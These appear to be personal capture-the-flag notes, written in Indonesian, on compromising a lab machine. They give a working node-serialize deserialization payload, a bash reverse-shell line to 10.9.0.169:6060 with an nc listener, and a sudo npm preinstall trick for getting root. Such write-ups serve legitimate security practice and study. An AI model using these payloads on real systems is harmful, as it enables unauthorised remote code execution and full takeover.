# boot:
1. scan nmap -> 22 80 buka -> fuzz gabisa
2. tes burp -> inject email ada session json base64 a:"a"
3. https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ 
4. {
  "email": "_$$ND_FUNC$$_function (){\n \t require('child_process').exec('perintah', function(error, stdout, stderr) { console.log(stdout) });\n }()"
}
5. itu buat value "email" nya jadi gini
6. {
  "email": "_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ping -c 1 <YOUR_IP>',
  function(error, stdout, stderr) { console.log(stdout) });\n }()"
}
7. forward nya ke get tapi setelah post itu
8. sudo tcpdump -i tun0 icmp -> get request pake session tadi di base64
9. exec aja -> {
  "email": "_$$ND_FUNC$$_function (){\n \t require('child_process').exec('bash -c \"bash -i >& /dev/tcp/10.9.0.169/6060  0>&1\"', function(error, stdout, stderr) { console.log(stdout) });\n }()"
}
10. sambil nyalain nc -> dah dapet user.txt

# pe:
1. sudo -l -> npm cari di gtfobins
2. sidu=${mktemp -d} -> echo '{"scripts": {"preinstall": "/bin/sh"}}' > $sidu/package.json  
3. sudo npm -C $sidu --unsafe-perm i -> klaim root
